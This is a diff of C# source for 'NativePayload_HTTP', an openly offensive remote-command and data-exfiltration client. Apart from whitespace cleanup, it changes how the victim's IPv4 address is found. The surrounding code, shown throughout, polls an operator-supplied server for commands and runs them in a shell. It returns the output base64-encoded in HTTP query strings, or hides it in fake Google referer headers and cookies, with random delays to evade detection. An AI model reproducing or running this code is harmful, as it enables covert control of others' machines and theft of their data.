@@ -13,23 +13,23 @@ namespace NativePayload_HTTP
     {
         public static string DumpHtml(string url)
         {
-           
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
 
-                string _output = "";
-                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-                using (Stream stream = response.GetResponseStream())
-                using (StreamReader reader = new StreamReader(stream))
-                {
-                    _output = reader.ReadToEnd();
-                   return _output.Substring(0, _output.Length - 1);
-                }
-          
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
+
+            string _output = "";
+            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+            using (Stream stream = response.GetResponseStream())
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                _output = reader.ReadToEnd();
+                return _output.Substring(0, _output.Length - 1);
+            }
+
         }
-        public static void DumpHtml(string url , bool FakeHeader , string FakeHeaderMode, string value)
+        public static void DumpHtml(string url, bool FakeHeader, string FakeHeaderMode, string value)
         {
-            
+
             if (FakeHeader)
             {
                 if (FakeHeaderMode.ToUpper() == "REFERER")
@@ -37,19 +37,19 @@ namespace NativePayload_HTTP
                     try
                     {
                         WebClient request = new WebClient();
-                        
-                        request.Headers.Add( HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&" + "uids=" + value + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
-                        
+
+                        request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&" + "uids=" + value + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
+
                         request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                         request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                         request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
                         request.DownloadData(url);
                         request.Dispose();
-                        
+
                     }
                     catch (Exception e)
                     {
-                        Console.WriteLine(e.Message);                     
+                        Console.WriteLine(e.Message);
                     }
                 }
                 if (FakeHeaderMode.ToUpper() == "COOKIES")
@@ -58,7 +58,7 @@ namespace NativePayload_HTTP
                     {
                         WebClient request = new WebClient();
                         request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");
-                        
+
                         request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                         request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                         request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -93,7 +93,7 @@ namespace NativePayload_HTTP
             xtemp = "[" + _AllIPs + "] => " + CMDoutput;
             return xtemp;
         }
-        public static string _DetectingHTMLValues(string[] _OUTPUT , string _Searchstr)
+        public static string _DetectingHTMLValues(string[] _OUTPUT, string _Searchstr)
         {
             string Oonaggi = ";D";
             foreach (var item in _OUTPUT)
@@ -108,7 +108,7 @@ namespace NativePayload_HTTP
         }
         static void Main(string[] args)
         {
-           
+
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.DarkGray;
             Console.WriteLine("NativePayload_HTTP v1.1 , Published by Damon Mohammadbagher , Jan 2019");
@@ -122,14 +122,14 @@ namespace NativePayload_HTTP
                 Console.WriteLine("DATA/Commands Exfiltration Started (Client Side)");
                 Console.WriteLine("Connecting.Server:[" + args[1] + ":" + args[2] + "]");
                 Console.WriteLine();
-                
+
                 string Command1 = "";
                 string Command2 = "";
                 string FirstIP = "";
                 Random mydelayII, mydelayI, mydelay;
                 string OS = "";
-                IPHostEntry IPv4s;
-                IPAddress[] AllIPs;
+                // IPHostEntry IPv4s;
+                // IPAddress[] AllIPs;
                 string FirstIP_B64Encode;
                 byte[] B64encodebytes;
                 byte[] MakeB64;
@@ -153,31 +153,37 @@ namespace NativePayload_HTTP
                 string FakeHeaderMode = "";
                 string FakeHeaderModetmp = "";
                 string RefreshedPageDetection;
-                string Delay="0";
-                int _delay = 0; ;               
+                string Delay = "0";
+                int _delay = 0; ;
                 WebClient request = new WebClient();
-                byte[] dumpedhtmls;               
+                byte[] dumpedhtmls;
                 bool init = false;
-                
                 string DelaytempIPv4, Delaytemp;
+                string IPv4 = Dns.GetHostEntry(Dns.GetHostName()).AddressList.First(x => x.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).ToString();
+
+                // Console.Write("Please enter your local IPv4 Address:");
+                // string IPv4 = Console.ReadLine();
+
                 while (true)
                 {
-                  
+
                     mydelay = new Random();
                     d = mydelay.Next(10000, 60000);
-                    if (Delay !="0" && Delay != "" && Delay!=";D") { _delay = Convert.ToInt32(Delay); d = _delay * 1000; }
-                  
+                    if (Delay != "0" && Delay != "" && Delay != ";D") { _delay = Convert.ToInt32(Delay); d = _delay * 1000; }
+
                     Console.ForegroundColor = ConsoleColor.Gray;
                     Console.WriteLine("[!]:CMD:Checking.Server.[" + args[1] + "]::SendbyHttp:Signal.Delay.Random:[" + d.ToString() + "]:Started [" + DateTime.Now.ToString() + "]");
 
                     OS = "Win:" + System.Environment.OSVersion.Version.ToString();
-                    IPv4s = Dns.GetHostEntry("127.0.0.1");
-                    AllIPs = IPv4s.AddressList;
-                    FirstIP = OS + " " + AllIPs[1].ToString() + " ";
+                    // IPv4s = Dns.GetHostEntry("127.0.0.1");
+                    // AllIPs = IPv4s.AddressList;
+                    // FirstIP = OS + " " + AllIPs[1].ToString() + " ";
+                    FirstIP = OS + " " + IPv4 + " ";
+
 
                     B64encodebytes = UTF8Encoding.ASCII.GetBytes(FirstIP);
-                    FirstIP_B64Encode = Convert.ToBase64String(B64encodebytes);                
-                    
+                    FirstIP_B64Encode = Convert.ToBase64String(B64encodebytes);
+
                     MakeB64 = System.Text.Encoding.ASCII.GetBytes(FirstIP_B64Encode);
                     ConvertoBytes = BitConverter.ToString(MakeB64);
 
@@ -196,33 +202,33 @@ namespace NativePayload_HTTP
                     {
 
                         if (!init)
-                        {                         
-                                output = DumpHtml("http://" + args[1] + "/default.aspx?Session=a0" + rev);
-                                Thread.Sleep(d);
-                                output = DumpHtml("http://" + args[1] + "/getcmd.aspx?logoff=command");
-                                                      
+                        {
+                            output = DumpHtml("http://" + args[1] + "/default.aspx?Session=a0" + rev);
+                            Thread.Sleep(d);
+                            output = DumpHtml("http://" + args[1] + "/getcmd.aspx?logoff=command");
+
                         }
-                        
+
                         if (FakeHeader_onoff_status.ToLower() == "xheader-on")
-                        {   
+                        {
                             if (FakeHeaderMode.ToUpper() == "REFERER")
                             {
                                 /// FakeHeader mode [on] payload injection via [referer]
                                 request = new WebClient();
-                                
-                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&Session=a0" + rev + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");                             
+
+                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&Session=a0" + rev + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
 
                                 request.DownloadData("http://" + args[1] + "/default.aspx");
                                 request.Dispose();
-                               
-                              
+
+
                                 Thread.Sleep(d);
-                                
+
                                 request = new WebClient();
-                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&logoff=command" + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");                               
+                                request.Headers.Add(HttpRequestHeader.Referer, "https://www.google.com/search?ei=bsZAXPSqD&logoff=command" + "&q=d37X3d3PS&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q");
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -230,15 +236,15 @@ namespace NativePayload_HTTP
                                 dumpedhtmls = request.DownloadData("http://" + args[1] + "/getcmd.aspx");
                                 request.Dispose();
                                 output = Encoding.ASCII.GetString(dumpedhtmls);
-                               
+
                             }
                             else if (FakeHeaderMode.ToUpper() == "COOKIES")
                             {
                                 /// FakeHeader mode [on] payload injection via [cookies]
-                               
+
                                 request = new WebClient();
                                 request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");
-                               
+
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -249,10 +255,10 @@ namespace NativePayload_HTTP
                                 output = Encoding.ASCII.GetString(dumpedhtmls);
 
                                 Thread.Sleep(d);
-                               
+
                                 request = new WebClient();
                                 request.Headers.Add(HttpRequestHeader.Referer, @"https://www.bing.com");
-                              
+
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -261,15 +267,15 @@ namespace NativePayload_HTTP
                                 dumpedhtmls = request.DownloadData("http://" + args[1] + "/getcmd.aspx");
                                 request.Dispose();
                                 output = Encoding.ASCII.GetString(dumpedhtmls);
-                               
-                                
+
+
                             }
                             else if (FakeHeaderMode.ToUpper() == "")
                             {
                                 /// FakeHeader mode [on] only
-                               
+
                                 request = new WebClient();
-                               
+
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -280,7 +286,7 @@ namespace NativePayload_HTTP
 
                                 Thread.Sleep(d);
                                 request = new WebClient();
-                               
+
                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -316,7 +322,8 @@ namespace NativePayload_HTTP
 
                         /// Detecting delay for this client
                         //Delay = tempdelay;
-                        temp = AllIPs[1].ToString();
+                        //temp = AllIPs[1].ToString();
+                        temp = IPv4;
                         _Targethost = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_TargetHost");
                         if (_Targethost.Contains(temp))
                         {
@@ -326,7 +333,7 @@ namespace NativePayload_HTTP
                         }
 
                         /// Detecting refreshed page
-                        RefreshedPageDetection = _DetectingHTMLValues(_OUTPUT, "myTimeLabelx");                       
+                        RefreshedPageDetection = _DetectingHTMLValues(_OUTPUT, "myTimeLabelx");
                         if (RefreshedPageDetection != "")
                         {
                             Command1 = Command2; CMDTime1 = CMDTime2;
@@ -340,7 +347,7 @@ namespace NativePayload_HTTP
                         /// Detecting FakeheaderMode is 0,1,2?
                         FakeHeaderModetmp = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_FakeHeaderMode");
                         if (FakeHeaderModetmp.Contains(",1")) FakeHeaderMode = "REFERER";
-                        if (FakeHeaderModetmp.Contains(",2")) FakeHeaderMode = "COOKIES";  
+                        if (FakeHeaderModetmp.Contains(",2")) FakeHeaderMode = "COOKIES";
                         if (FakeHeaderModetmp.Contains(",0")) FakeHeaderMode = "";
 
                         /// Detecting CMD                    
@@ -361,8 +368,8 @@ namespace NativePayload_HTTP
 
 
                         if (Command1 == "init") { Command1 = Command2; CMDTime1 = CMDTime2; }
-                        temp = AllIPs[1].ToString();
-
+                        //temp = AllIPs[1].ToString();
+                        temp = IPv4;
                         /// if your IPv4 Detected in cmd
                         /// Detecting your IPV4 [Target-Host]
                         _Targethost = _DetectingHTMLValues(_OUTPUT, "myTimeLabel_TargetHost");
@@ -388,7 +395,7 @@ namespace NativePayload_HTTP
                                 Console.WriteLine("[!]:CMD:[" + tmpcmd + "].Sending.Cmd.output::SendbyHttp::Delay:[" + d.ToString() + "]:Started [" + DateTime.Now.ToString() + "]");
                                 try
                                 {
-                                    temp = _CMDshell(Command1, AllIPs[1].ToString());
+                                    temp = _CMDshell(Command1, IPv4);
 
 
                                     /// BASE64 is "On" by Server
@@ -450,7 +457,7 @@ namespace NativePayload_HTTP
                                             {
                                                 Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request.Base64:[/default.aspx?uids=" + temp_rev + "]");
                                             }
-                                         
+
                                         }
                                         if (!Clientside_Rnd_Base64_is_onoff)
                                         {
@@ -471,7 +478,7 @@ namespace NativePayload_HTTP
                                                 Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                             }
 
-                                            
+
                                         }
                                         Thread.Sleep(d);
 
@@ -484,19 +491,19 @@ namespace NativePayload_HTTP
                                         {
                                             if (FakeHeaderMode == "REFERER" || FakeHeaderMode == "COOKIES")
                                             {
-                                               // Console.WriteLine("wow");
+                                                // Console.WriteLine("wow");
                                                 DumpHtml("http://" + args[1] + "/default.aspx", true, FakeHeaderMode, temp_rev);
                                             }
 
                                             if (FakeHeaderMode == "")
                                             {
-                                               
+
                                                 /// FakeHeader mode [on] only without payload injection
-                                               
+
                                                 try
                                                 {
                                                     request = new WebClient();
-                                                   // request.Headers.Add(HttpRequestHeader.Connection, "keep-alive");
+                                                    // request.Headers.Add(HttpRequestHeader.Connection, "keep-alive");
                                                     request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                                     request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                                     request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -542,7 +549,7 @@ namespace NativePayload_HTTP
 
                                         }
 
-                                     
+
                                     }
                                     if (!Clientside_Rnd_Base64_is_onoff)
                                     {
@@ -561,11 +568,11 @@ namespace NativePayload_HTTP
                                         {
                                             Console.WriteLine("[>]:CMD:Bytes:[" + rev + "]::SendbyHttp::Delay:[" + d.ToString() + "]::Web.Request:[/default.aspx?uids=" + temp_rev + "]");
                                         }
-                                      
+
                                     }
                                     Console.ForegroundColor = ConsoleColor.DarkCyan;
                                     Console.WriteLine("[!]:CMD:[" + tmpcmd + "].Sending.Cmd.output::SendbyHttp::Web.Requests.Count[" + i2.ToString() + "/" + i3.ToString() + "]:Done");
-                                    
+
                                     //// Detecting FakeHeader Injection Status [on/off]
 
                                     if (FakeHeader_onoff_status == "xheader-off")
@@ -580,11 +587,11 @@ namespace NativePayload_HTTP
                                         if (FakeHeaderMode == "")
                                         {
                                             try
-                                            {                                              
+                                            {
                                                 /// FakeHeader mode [on] only without payload injection
-                                              
+
                                                 request = new WebClient();
-                                               
+
                                                 request.Headers.Add(HttpRequestHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                                 request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US;q=0.8,en;q=0.6");
                                                 request.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0");
@@ -611,15 +618,15 @@ namespace NativePayload_HTTP
                                 catch (Exception)
                                 {
 
-                                   // throw;
+                                    // throw;
                                 }
 
                             }
-                          
+
                         }
                         else
                         {
-                       
+
 
                         }
                         init = true;
